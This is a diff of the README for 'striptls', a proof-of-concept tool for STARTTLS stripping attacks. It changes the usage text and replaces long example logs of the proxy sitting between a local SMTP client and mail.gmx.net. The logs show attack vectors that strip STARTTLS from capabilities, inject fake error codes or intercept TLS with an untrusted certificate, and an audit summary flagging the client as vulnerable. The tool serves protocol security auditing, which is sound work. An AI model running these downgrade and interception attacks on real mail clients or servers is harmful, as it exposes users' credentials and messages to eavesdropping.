@@ -29,33 +29,35 @@ poc implementation of STARTTLS stripping attacks
 
 ## Usage
 
-    #> python -m striptls --help	# in case you've installed it from pip/setup.py
-    #> python striptls                  # from source
-    Usage: striptls [options]
-            example: striptls --listen 0.0.0.0:25 --remote mail.server.tld:25 --tests *
-
-
-    Options:
-      -h, --help            show this help message and exit
-      -v, --verbose         make lots of noise [default]
-      -l LISTEN, --listen=LISTEN
-                            listen ip:port
-      -r REMOTE, --remote=REMOTE
-                            target ip:port
-      -t TESTS, --tests=TESTS
-                            Comma separated list of tests. * selects ALL.
-                            Available Tests: FTP.StripFromCapabilities,
-                            FTP.StripWithError, FTP.UntrustedIntercept,
-                            IMAP.StripFromCapabilities, IMAP.StripWithError,
-                            IMAP.UntrustedIntercept, NNTP.StripFromCapabilities,
-                            NNTP.StripWithError, NNTP.UntrustedIntercept,
-                            POP3.StripWithError, POP3.UntrustedIntercept,
-                            SMTP.StripFromCapabilities, SMTP.StripWithError,
-                            SMTP.StripWithInvalidResponseCode,
-                            SMTP.StripWithTemporaryError, SMTP.UntrustedIntercept,
-                            XMPP.StripFromCapabilities [default: *]
-    Usage: striptls [options]
-            example: striptls --listen 0.0.0.0:25 --remote mail.server.tld:25 --tests *
+    #> python -m striptls --help	# if installed from pip/setup.py
+    #> python striptls --help       # from source / root folder
+	Usage: striptls [options]
+	
+	       example: striptls --listen 0.0.0.0:25 --remote mail.server.tld:25
+	
+	
+	Options:
+	  -h, --help            show this help message and exit
+	  -v, --verbose         make lots of noise [default]
+	  -l LISTEN, --listen=LISTEN
+	                        listen ip:port [default: 0.0.0.0:<remote_port>]
+	  -r REMOTE, --remote=REMOTE
+	                        remote target ip:port to forward sessions to
+	  -k KEY, --key=KEY     SSL Certificate and Private key file to use, PEM
+	                        format assumed [default: server.pem]
+	  -x VECTORS, --vectors=VECTORS
+	                        Comma separated list of vectors. Use 'ALL' (default)
+	                        to select all vectors. Available vectors:
+	                        FTP.StripFromCapabilities, FTP.StripWithError,
+	                        FTP.UntrustedIntercept, IMAP.StripFromCapabilities,
+	                        IMAP.StripWithError, IMAP.UntrustedIntercept,
+	                        NNTP.StripFromCapabilities, NNTP.StripWithError,
+	                        NNTP.UntrustedIntercept, POP3.StripWithError,
+	                        POP3.UntrustedIntercept, SMTP.StripFromCapabilities,
+	                        SMTP.StripWithError,
+	                        SMTP.StripWithInvalidResponseCode,
+	                        SMTP.StripWithTemporaryError, SMTP.UntrustedIntercept,
+	                        XMPP.StripFromCapabilities [default: ALL]
 
 
 
@@ -71,89 +73,103 @@ from source
 
 ## Examples
 
-local smtp-client -> localhost:8825 (proxy) -> mail.gmx.net:25
+	                  inbound                    outbound
+	[inbound_peer]<------------->[listen:proxy]<------------->[outbound_peer/target]
+	  smtp-client                   striptls                    remote/target
+	  
+local `smtp-client` -> `localhost:8825` (proxy) -> `mail.gmx.net:25`
 
 ### Audit Mode
 
 iterates all protocol specific cases on a per client basis and keeps track of clients violating the starttls protocol. Ctrl+C to abort audit and print results.
 
-	#> striptls/striptls.py --listen localhost:8825 --remote=mail.gmx.net:25
-	2016-01-31 22:48:03,805 - INFO     - <Proxy 0x20a8fb0 listen=('0.0.0.0', 8825) target=('mail.gmx.net', 25)> ready.
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:21   , proto:     FTP): <class __main__.StripFromCapabilities at 0x020B1148>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:21   , proto:     FTP): <class __main__.StripWithError at 0x020B1180>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:21   , proto:     FTP): <class __main__.UntrustedIntercept at 0x020B11B8>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:143  , proto:    IMAP): <class __main__.StripFromCapabilities at 0x020B1068>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:143  , proto:    IMAP): <class __main__.StripWithError at 0x020B10A0>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:143  , proto:    IMAP): <class __main__.UntrustedIntercept at 0x020B10D8>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:119  , proto:    NNTP): <class __main__.StripFromCapabilities at 0x020B1228>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:119  , proto:    NNTP): <class __main__.StripWithError at 0x020B1260>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:119  , proto:    NNTP): <class __main__.UntrustedIntercept at 0x020B1298>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:110  , proto:    POP3): <class __main__.StripWithError at 0x02099F80>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:110  , proto:    POP3): <class __main__.UntrustedIntercept at 0x02099FB8>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:25   , proto:    SMTP): <class __main__.StripFromCapabilities at 0x02099E30>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:25   , proto:    SMTP): <class __main__.StripWithError at 0x02099ED8>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:25   , proto:    SMTP): <class __main__.StripWithInvalidResponseCode at 0x02099E68>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:25   , proto:    SMTP): <class __main__.StripWithTemporaryError at 0x02099EA0>
-	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:25   , proto:    SMTP): <class __main__.UntrustedIntercept at 0x02099F10>
-	2016-01-31 22:48:03,806 - DEBUG    - * added test (port:5222 , proto:    XMPP): <class __main__.StripFromCapabilities at 0x020B1308>
-	2016-01-31 22:48:03,806 - INFO     - <RewriteDispatcher rules={5222: set([<class __main__.StripFromCapabilities at 0x020B1308>]), 110: set([<class __main__.StripWithError at 0x02099F80>, <class __main__.UntrustedIntercept at 0x02099FB8>]), 143: set([<class __main__.StripWithError at 0x020B10A0>, <class __main__.UntrustedIntercept at 0x020B10D8>, <class __main__.StripFromCapabilities at 0x020B1068>]), 21: set([<class __main__.StripWithError at 0x020B1180>, <class __main__.UntrustedIntercept at 0x020B11B8>, <class __main__.StripFromCapabilities at 0x020B1148>]), 119: set([<class __main__.UntrustedIntercept at 0x020B1298>, <class __main__.StripFromCapabilities at 0x020B1228>, <class __main__.StripWithError at 0x020B1260>]), 25: set([<class __main__.UntrustedIntercept at 0x02099F10>, <class __main__.StripWithTemporaryError at 0x02099EA0>, <class __main__.StripFromCapabilities at 0x02099E30>, <class __main__.StripWithError at 0x02099ED8>, <class __main__.StripWithInvalidResponseCode at 0x02099E68>])}>
-	2016-01-31 22:48:07,921 - DEBUG    - <ProtocolDetect 0x20cbc50 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
-	2016-01-31 22:48:07,923 - INFO     - <Session 0x20be1f0> client ('127.0.0.1', 22898) has connected
-	2016-01-31 22:48:07,923 - INFO     - <Session 0x20be1f0> connecting to target ('mail.gmx.net', 25)
-	2016-01-31 22:48:08,158 - DEBUG    - <Session 0x20be1f0> [client] <= [server]          '220 gmx.com (mrgmx002) Nemesis ESMTP Service ready\r\n'
-	2016-01-31 22:48:08,158 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.UntrustedIntercept new: True>
-	2016-01-31 22:48:09,112 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'ehlo [192.168.139.1]\r\n'
-	2016-01-31 22:48:09,194 - DEBUG    - <Session 0x20be1f0> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
-	2016-01-31 22:48:09,194 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'STARTTLS\r\n'
-	2016-01-31 22:48:09,194 - DEBUG    - <Session 0x20be1f0> [client] <= [server][mangled] '220 Go ahead\r\n'
-	2016-01-31 22:48:09,444 - DEBUG    - <Session 0x20be1f0> [client] <= [server][mangled] waiting for inbound SSL Handshake
-	2016-01-31 22:48:09,444 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'STARTTLS\r\n'
-	2016-01-31 22:48:09,538 - DEBUG    - <Session 0x20be1f0> [client] => [server][mangled] performing outbound SSL handshake
-	2016-01-31 22:48:09,948 - DEBUG    - <Session 0x20be1f0> [client] => [server][mangled] None
-	2016-01-31 22:48:09,948 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'ehlo [192.168.139.1]\r\n'
-	2016-01-31 22:48:10,029 - DEBUG    - <Session 0x20be1f0> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 69920427\r\n250 AUTH LOGIN PLAIN\r\n'
-	2016-01-31 22:48:10,029 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
-	2016-01-31 22:48:10,108 - DEBUG    - <Session 0x20be1f0> [client] <= [server]          '530 Authentication required\r\n'
-	2016-01-31 22:48:10,108 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'rset\r\n'
-	2016-01-31 22:48:10,217 - DEBUG    - <Session 0x20be1f0> [client] <= [server]          '250 OK\r\n'
-	2016-01-31 22:48:10,230 - WARNING  - <Session 0x20be1f0> terminated.
-	2016-01-31 22:48:12,375 - DEBUG    - <ProtocolDetect 0x20cbd70 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
-	2016-01-31 22:48:12,377 - INFO     - <Session 0x20cbcf0> client ('127.0.0.1', 22901) has connected
-	2016-01-31 22:48:12,377 - INFO     - <Session 0x20cbcf0> connecting to target ('mail.gmx.net', 25)
-	2016-01-31 22:48:12,517 - DEBUG    - <Session 0x20cbcf0> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
-	2016-01-31 22:48:12,517 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.StripWithTemporaryError new: True>
-	2016-01-31 22:48:13,503 - DEBUG    - <Session 0x20cbcf0> [client] => [server]          'ehlo [192.168.139.1]\r\n'
-	2016-01-31 22:48:13,585 - DEBUG    - <Session 0x20cbcf0> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
-	2016-01-31 22:48:13,601 - DEBUG    - <Session 0x20cbcf0> [client] => [server]          'STARTTLS\r\n'
-	2016-01-31 22:48:13,601 - DEBUG    - <Session 0x20cbcf0> [client] <= [server][mangled] '454 TLS not available due to temporary reason\r\n'
-	2016-01-31 22:48:13,601 - DEBUG    - <Session 0x20cbcf0> [client] => [server][mangled] None
-	2016-01-31 22:48:13,601 - DEBUG    - <Session 0x20cbcf0> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
-	2016-01-31 22:48:13,696 - DEBUG    - <Session 0x20cbcf0> [client] <= [server]          '530 Authentication required\r\n'
-	2016-01-31 22:48:13,711 - DEBUG    - <Session 0x20cbcf0> [client] => [server]          'rset\r\n'
-	2016-01-31 22:48:13,789 - DEBUG    - <Session 0x20cbcf0> [client] <= [server]          '250 OK\r\n'
-	2016-01-31 22:48:13,805 - WARNING  - <Session 0x20cbcf0> terminated.
-	2016-01-31 22:48:15,648 - DEBUG    - <ProtocolDetect 0x20cbe30 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
-	2016-01-31 22:48:15,650 - INFO     - <Session 0x20cbd30> client ('127.0.0.1', 22904) has connected
-	2016-01-31 22:48:15,650 - INFO     - <Session 0x20cbd30> connecting to target ('mail.gmx.net', 25)
-	2016-01-31 22:48:15,808 - DEBUG    - <Session 0x20cbd30> [client] <= [server]          '220 gmx.com (mrgmx001) Nemesis ESMTP Service ready\r\n'
-	2016-01-31 22:48:15,808 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.StripFromCapabilities new: True>
-	2016-01-31 22:48:16,778 - DEBUG    - <Session 0x20cbd30> [client] => [server]          'ehlo [192.168.139.1]\r\n'
-	2016-01-31 22:48:16,907 - DEBUG    - <Session 0x20cbd30> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
-	2016-01-31 22:48:16,907 - DEBUG    - <Session 0x20cbd30> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250 AUTH LOGIN PLAIN\r\n'
-	2016-01-31 22:48:16,921 - WARNING  - <Session 0x20cbd30> terminated.
-	2016-01-31 22:48:59,542 - WARNING  - <Session 0x20b97f0> terminated.
-	...
-	2016-01-31 22:49:03,305 - WARNING  - Ctrl C - Stopping server
-	2016-01-31 22:49:03,305 - INFO     -  -- audit results --
-	2016-01-31 22:49:03,305 - INFO     - [*] client: 127.0.0.1
-	2016-01-31 22:49:03,305 - INFO     -     [           ] <class __main__.StripFromCapabilities at 0x01ECF180>
-	2016-01-31 22:49:03,305 - INFO     -     [Vulnerable!] <class __main__.StripWithError at 0x01ECF688>
-	2016-01-31 22:49:03,305 - INFO     -     [Vulnerable!] <class __main__.UntrustedIntercept at 0x01ECF6F8>
-	2016-01-31 22:49:03,305 - INFO     -     [Vulnerable!] <class __main__.StripWithInvalidResponseCode at 0x01ECF5E0>
+	#> python striptls --listen localhost:8825 --remote=mail.gmx.net:25
+	2016-02-02 22:11:56,275 - INFO     - <Proxy 0xffcf6d0cL listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:21   , proto:     FTP): <class striptls.StripFromCapabilities at 0xffd4632c>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:21   , proto:     FTP): <class striptls.StripWithError at 0xffd4635c>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:21   , proto:     FTP): <class striptls.UntrustedIntercept at 0xffd4638c>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:143  , proto:    IMAP): <class striptls.StripFromCapabilities at 0xffd4626c>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:143  , proto:    IMAP): <class striptls.StripWithError at 0xffd4629c>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:143  , proto:    IMAP): <class striptls.UntrustedIntercept at 0xffd462cc>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:119  , proto:    NNTP): <class striptls.StripFromCapabilities at 0xffd463ec>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:119  , proto:    NNTP): <class striptls.StripWithError at 0xffd4641c>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:119  , proto:    NNTP): <class striptls.UntrustedIntercept at 0xffd4644c>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:110  , proto:    POP3): <class striptls.StripWithError at 0xffd461dc>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:110  , proto:    POP3): <class striptls.UntrustedIntercept at 0xffd4620c>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripFromCapabilities at 0xffd316bc>
+	2016-02-02 22:11:56,275 - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripWithError at 0xffd4614c>
+	2016-02-02 22:11:56,276 - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripWithInvalidResponseCode at 0xffd3138c>
+	2016-02-02 22:11:56,276 - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.StripWithTemporaryError at 0xffd4611c>
+	2016-02-02 22:11:56,276 - DEBUG    - * added test (port:25   , proto:    SMTP): <class striptls.UntrustedIntercept at 0xffd4617c>
+	2016-02-02 22:11:56,276 - DEBUG    - * added test (port:5222 , proto:    XMPP): <class striptls.StripFromCapabilities at 0xffd464ac>
+	2016-02-02 22:11:56,276 - INFO     - <RewriteDispatcher vectors={5222: set([<class striptls.StripFromCapabilities at 0xffd464ac>]), 110: set([<class striptls.UntrustedIntercept at 0xffd4620c>, <class striptls.StripWithError at 0xffd461dc>]), 143: set([<class striptls.StripWithError at 0xffd4629c>, <class striptls.UntrustedIntercept at 0xffd462cc>, <class striptls.StripFromCapabilities at 0xffd4626c>]), 21: set([<class striptls.UntrustedIntercept at 0xffd4638c>, <class striptls.StripFromCapabilities at 0xffd4632c>, <class striptls.StripWithError at 0xffd4635c>]), 119: set([<class striptls.StripWithError at 0xffd4641c>, <class striptls.UntrustedIntercept at 0xffd4644c>, <class striptls.StripFromCapabilities at 0xffd463ec>]), 25: set([<class striptls.StripWithInvalidResponseCode at 0xffd3138c>, <class striptls.StripWithTemporaryError at 0xffd4611c>, <class striptls.StripFromCapabilities at 0xffd316bc>, <class striptls.StripWithError at 0xffd4614c>, <class striptls.UntrustedIntercept at 0xffd4617c>])}>
+	2016-02-02 22:12:08,477 - DEBUG    - <ProtocolDetect 0xffcf6eccL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
+	2016-02-02 22:12:08,530 - INFO     - <Session 0xffcf6e4cL> client ('127.0.0.1', 28902) has connected
+	2016-02-02 22:12:08,530 - INFO     - <Session 0xffcf6e4cL> connecting to target ('mail.gmx.net', 25)
+	2016-02-02 22:12:08,805 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '220 gmx.com (mrgmx001) Nemesis ESMTP Service ready\r\n'
+	2016-02-02 22:12:08,805 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripWithInvalidResponseCode new: True>
+	2016-02-02 22:12:09,759 - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
+	2016-02-02 22:12:09,850 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
+	2016-02-02 22:12:09,851 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250-STARTTLS\r\n250 STARTTLS\r\n'
+	2016-02-02 22:12:09,867 - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'STARTTLS\r\n'
+	2016-02-02 22:12:09,867 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server][mangled] '200 STRIPTLS\r\n'
+	2016-02-02 22:12:09,867 - DEBUG    - <Session 0xffcf6e4cL> [client] => [server][mangled] None
+	2016-02-02 22:12:09,883 - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
+	2016-02-02 22:12:09,983 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '530 Authentication required\r\n'
+	2016-02-02 22:12:09,992 - DEBUG    - <Session 0xffcf6e4cL> [client] => [server]          'rset\r\n'
+	2016-02-02 22:12:10,100 - DEBUG    - <Session 0xffcf6e4cL> [client] <= [server]          '250 OK\r\n'
+	2016-02-02 22:12:10,116 - WARNING  - <Session 0xffcf6e4cL> terminated.
+	2016-02-02 22:12:13,056 - DEBUG    - <ProtocolDetect 0xffd0920cL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
+	2016-02-02 22:12:13,056 - INFO     - <Session 0xffd0918cL> client ('127.0.0.1', 28905) has connected
+	2016-02-02 22:12:13,057 - INFO     - <Session 0xffd0918cL> connecting to target ('mail.gmx.net', 25)
+	2016-02-02 22:12:13,241 - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
+	2016-02-02 22:12:13,241 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripWithTemporaryError new: True>
+	2016-02-02 22:12:14,197 - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
+	2016-02-02 22:12:14,289 - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
+	2016-02-02 22:12:14,304 - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'STARTTLS\r\n'
+	2016-02-02 22:12:14,305 - DEBUG    - <Session 0xffd0918cL> [client] <= [server][mangled] '454 TLS not available due to temporary reason\r\n'
+	2016-02-02 22:12:14,305 - DEBUG    - <Session 0xffd0918cL> [client] => [server][mangled] None
+	2016-02-02 22:12:14,320 - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
+	2016-02-02 22:12:14,411 - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '530 Authentication required\r\n'
+	2016-02-02 22:12:14,415 - DEBUG    - <Session 0xffd0918cL> [client] => [server]          'rset\r\n'
+	2016-02-02 22:12:14,520 - DEBUG    - <Session 0xffd0918cL> [client] <= [server]          '250 OK\r\n'
+	2016-02-02 22:12:14,535 - WARNING  - <Session 0xffd0918cL> terminated.
+	2016-02-02 22:12:16,649 - DEBUG    - <ProtocolDetect 0xffd092ecL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
+	2016-02-02 22:12:16,650 - INFO     - <Session 0xffd0926cL> client ('127.0.0.1', 28908) has connected
+	2016-02-02 22:12:16,650 - INFO     - <Session 0xffd0926cL> connecting to target ('mail.gmx.net', 25)
+	2016-02-02 22:12:16,820 - DEBUG    - <Session 0xffd0926cL> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
+	2016-02-02 22:12:16,820 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripFromCapabilities new: True>
+	2016-02-02 22:12:17,760 - DEBUG    - <Session 0xffd0926cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
+	2016-02-02 22:12:17,849 - DEBUG    - <Session 0xffd0926cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
+	2016-02-02 22:12:17,849 - DEBUG    - <Session 0xffd0926cL> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250 AUTH LOGIN PLAIN\r\n'
+	2016-02-02 22:12:17,871 - WARNING  - <Session 0xffd0926cL> terminated.
+	2016-02-02 22:12:20,071 - DEBUG    - <ProtocolDetect 0xffd093ccL protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
+	2016-02-02 22:12:20,072 - INFO     - <Session 0xffd0934cL> client ('127.0.0.1', 28911) has connected
+	2016-02-02 22:12:20,072 - INFO     - <Session 0xffd0934cL> connecting to target ('mail.gmx.net', 25)
+	2016-02-02 22:12:20,239 - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '220 gmx.com (mrgmx002) Nemesis ESMTP Service ready\r\n'
+	2016-02-02 22:12:20,240 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripWithError new: True>
+	2016-02-02 22:12:21,181 - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'ehlo [192.168.139.1]\r\n'
+	2016-02-02 22:12:21,269 - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.2]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
+	2016-02-02 22:12:21,280 - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'STARTTLS\r\n'
+	2016-02-02 22:12:21,281 - DEBUG    - <Session 0xffd0934cL> [client] <= [server][mangled] '501 Syntax error\r\n'
+	2016-02-02 22:12:21,281 - DEBUG    - <Session 0xffd0934cL> [client] => [server][mangled] None
+	2016-02-02 22:12:21,289 - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
+	2016-02-02 22:12:21,381 - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '530 Authentication required\r\n'
+	2016-02-02 22:12:21,386 - DEBUG    - <Session 0xffd0934cL> [client] => [server]          'rset\r\n'
+	2016-02-02 22:12:21,469 - DEBUG    - <Session 0xffd0934cL> [client] <= [server]          '250 OK\r\n'
+	2016-02-02 22:12:21,485 - WARNING  - <Session 0xffd0934cL> terminated.
+	2016-02-02 22:12:23,665 - WARNING  - Ctrl C - Stopping server
+	2016-02-02 22:12:23,665 - INFO     -  -- audit results --
+	2016-02-02 22:12:23,666 - INFO     - [*] client: 127.0.0.1
+	2016-02-02 22:12:23,666 - INFO     -     [Vulnerable!] <class striptls.StripWithInvalidResponseCode at 0xffd3138c>
+	2016-02-02 22:12:23,666 - INFO     -     [Vulnerable!] <class striptls.StripWithTemporaryError at 0xffd4611c>
+	2016-02-02 22:12:23,666 - INFO     -     [           ] <class striptls.StripFromCapabilities at 0xffd316bc>
+	2016-02-02 22:12:23,666 - INFO     -     [Vulnerable!] <class striptls.StripWithError at 0xffd4614c>
+
 
 ### Strip STARTTLS from server capabilities
 
-	#> striptls/striptls.py --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.StripFromCapabilities
+	#> python striptls --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.StripFromCapabilities
 	2016-01-31 15:44:35,000 - INFO     - <Proxy 0x1fe6e70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
 	2016-01-31 15:44:35,000 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripFromCapabilities at 0x01FE77D8>])}>
 	2016-01-31 15:44:37,030 - DEBUG    - <ProtocolDetect 0x1fe6f90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
@@ -171,7 +187,7 @@ iterates all protocol specific cases on a per client basis and keeps track of cl
 
 ### Invalid STARTTLS response code
 
-	#> striptls/striptls.py --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.StripWithInvalidResponseCode
+	#> python striptls --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.StripWithInvalidResponseCode
 	2016-01-31 15:42:40,325 - INFO     - <Proxy 0x1fefe70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
 	2016-01-31 15:42:40,325 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripWithInvalidResponseCode at 0x02010730>])}>
 	2016-01-31 15:43:19,755 - DEBUG    - <ProtocolDetect 0x1feff90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
@@ -193,7 +209,7 @@ iterates all protocol specific cases on a per client basis and keeps track of cl
 
 ### Untrusted SSL Intercept (for clients not checking server cert trust)
 
-	#> striptls/striptls.py --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.UntrustedIntercept
+	#> python striptls --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.UntrustedIntercept
 	2016-01-31 15:59:02,417 - INFO     - <Proxy 0x1f468f0 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
 	2016-01-31 15:59:02,417 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.UntrustedIntercept at 0x01F45298>])}>
 	2016-01-31 15:59:06,292 - DEBUG    - <ProtocolDetect 0x1f46a10 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
